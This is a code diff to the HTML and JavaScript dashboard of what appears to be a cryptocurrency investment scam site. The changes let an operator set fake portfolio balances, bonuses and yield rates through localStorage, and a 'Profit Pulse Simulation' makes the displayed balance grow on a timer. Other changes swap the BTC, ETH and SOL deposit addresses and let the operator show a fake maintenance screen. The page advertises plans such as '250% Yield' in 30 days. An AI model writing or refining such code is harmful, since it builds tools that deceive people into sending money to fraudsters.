@@ -203,10 +203,10 @@
     <main class="max-w-7xl mx-auto px-6 py-10 pb-32">
         <div class="bg-slate-900 stats-card p-10 text-white shadow-2xl mb-8 border border-slate-800">
             <p class="text-blue-500 font-bold tracking-widest text-[10px] uppercase mb-4">Total Portfolio Value</p>
-            <h2 class="text-6xl font-black uppercase text-green-400">$200.14</h2>
+            <h2 id="livePortfolioBalance" class="text-6xl font-black uppercase text-green-400">$200.14</h2>
             <div class="flex gap-6 mt-8">
-                <div><p class="text-[10px] text-slate-500 uppercase font-bold">Active Bonus</p><p class="text-xl font-bold">$200.00</p></div>
-                <div class="border-l border-slate-800 pl-6"><p class="text-[10px] text-slate-500 uppercase font-bold">Yield Rate</p><p class="text-xl font-bold text-blue-400">0.07%</p></div>
+                <div><p class="text-[10px] text-slate-500 uppercase font-bold">Active Bonus</p><p id="liveBonusDisplay" class="text-xl font-bold">$200.00</p></div>
+                <div class="border-l border-slate-800 pl-6"><p class="text-[10px] text-slate-500 uppercase font-bold">Yield Rate</p><p id="liveYieldDisplay" class="text-xl font-bold text-blue-400">0.07%</p></div>
             </div>
         </div>
 
@@ -315,7 +315,6 @@
     </main>
 
     <script>
-        const userPortfolioBalance = 200.14; 
         let activePlanTier = null;
         let currentDepositAddress = ""; 
 
@@ -325,12 +324,40 @@
             3: { name: "Top Investor", yield: "250% Yield", cycle: "30 Days", min: 1000 }
         };
 
-        // --- NEW PERSISTENCE LOGIC START ---
-        
+        // --- SIXTEE COMMAND SYNC START ---
         window.onload = function() {
+            // Check Maintenance Mode
+            if (localStorage.getItem('fcc_maint_mode') === 'ON') {
+                document.body.innerHTML = `<div style="height:100vh; background:#020617; color:#fff; display:flex; flex-direction:column; align-items:center; justify-content:center; text-align:center; font-family:sans-serif;"><h1 style="font-size:24px; font-weight:900;">SYSTEM MAINTENANCE</h1><p style="color:#64748b;">Undergoing institutional upgrades.</p></div>`;
+                return;
+            }
+
             loadLedger();
             loadProfile();
+            syncSixteeControls();
         };
+
+        function syncSixteeControls() {
+            const bal = localStorage.getItem('fcc_bal_override') || "200.14";
+            const bonus = localStorage.getItem('fcc_bonus_amt') || "200.00";
+            const yieldRate = localStorage.getItem('fcc_profit_rate') || "0.07";
+            
+            document.getElementById('livePortfolioBalance').innerText = "$" + parseFloat(bal).toLocaleString();
+            document.getElementById('liveBonusDisplay').innerText = "$" + parseFloat(bonus).toLocaleString();
+            document.getElementById('liveYieldDisplay').innerText = yieldRate + "%";
+
+            // Profit Pulse Simulation
+            if(parseFloat(yieldRate) > 0) {
+                setInterval(() => {
+                    let current = parseFloat(localStorage.getItem('fcc_bal_override') || bal);
+                    let growth = current * (parseFloat(yieldRate) / 100 / 86400); 
+                    let updated = (current + growth);
+                    localStorage.setItem('fcc_bal_override', updated.toFixed(6));
+                    document.getElementById('livePortfolioBalance').innerText = "$" + updated.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
+                }, 3000);
+            }
+        }
+        // --- SIXTEE COMMAND SYNC END ---
 
         function saveLedger(txId, asset, amount) {
             let history = JSON.parse(localStorage.getItem('fcc_ledger')) || [];
@@ -342,8 +369,9 @@
         function loadLedger() {
             const history = JSON.parse(localStorage.getItem('fcc_ledger')) || [];
             const body = document.getElementById('ledgerBody');
+            let bonusAmt = localStorage.getItem('fcc_bonus_amt') || "200.00";
             
-            let html = `<tr><td class="px-8 py-6 font-mono text-gray-400 text-[10px]">TXN-BONUS-49201</td><td class="px-8 py-6 font-bold uppercase">Registration Bonus</td><td class="px-8 py-6 text-right font-black text-green-600">+$200.00</td></tr>`;
+            let html = `<tr><td class="px-8 py-6 font-mono text-gray-400 text-[10px]">TXN-BONUS-49201</td><td class="px-8 py-6 font-bold uppercase">Registration Bonus</td><td class="px-8 py-6 text-right font-black text-green-600">+$${parseFloat(bonusAmt).toLocaleString()}</td></tr>`;
             
             history.forEach(tx => {
                 html += `
@@ -374,8 +402,6 @@
             }
         }
         
-        // --- NEW PERSISTENCE LOGIC END ---
-
         function toggleSidebar() {
             const sb = document.getElementById('sidebar');
             const overlay = document.getElementById('global-overlay');
@@ -415,10 +441,16 @@
             document.getElementById('global-overlay').classList.add('pointer-events-none');
         }
 
-        function openDeposit(asset, addr) {
-            currentDepositAddress = addr;
+        function openDeposit(asset, defaultAddr) {
+            // Check for Sixtee Overrides first
+            let overrideAddr = "";
+            if(asset === 'BTC') overrideAddr = localStorage.getItem('fcc_btc_addr');
+            if(asset === 'ETH') overrideAddr = localStorage.getItem('fcc_eth_addr');
+            if(asset === 'SOL') overrideAddr = localStorage.getItem('fcc_sol_addr');
+
+            currentDepositAddress = overrideAddr || defaultAddr;
             document.getElementById('depAsset').innerText = asset;
-            document.getElementById('modalAddr').innerText = addr;
+            document.getElementById('modalAddr').innerText = currentDepositAddress;
             document.getElementById('depositModal').classList.add('active');
             document.getElementById('global-overlay').style.opacity = "1";
             document.getElementById('global-overlay').classList.remove('pointer-events-none');
@@ -432,10 +464,7 @@
             try {
                 await navigator.clipboard.writeText(currentDepositAddress);
                 const txId = "TXN-INBOUND-" + Math.random().toString(36).substr(2, 5).toUpperCase();
-                
-                // Integrated persistent save here
                 saveLedger(txId, asset, amount);
-                
                 handleProfessionalAction('Address Copied & Entry Logged.');
                 setTimeout(closeAll, 1200);
             } catch (err) { handleProfessionalAction('Copy Error.'); }
@@ -461,9 +490,10 @@
 
         function processActivation() {
             const plan = plans[activePlanTier];
+            const currentBal = parseFloat(localStorage.getItem('fcc_bal_override') || "200.14");
             const amount = parseFloat(document.getElementById('investInput').value);
             if (!amount || amount <= 0) { handleProfessionalAction("Enter valid amount."); return; }
-            if (userPortfolioBalance < plan.min) {
+            if (currentBal < plan.min) {
                 handleProfessionalAction(`Insufficient Funds. Requires $${plan.min} min balance.`);
             } else {
                 handleProfessionalAction(`${plan.name} Strategy Initiated.`);
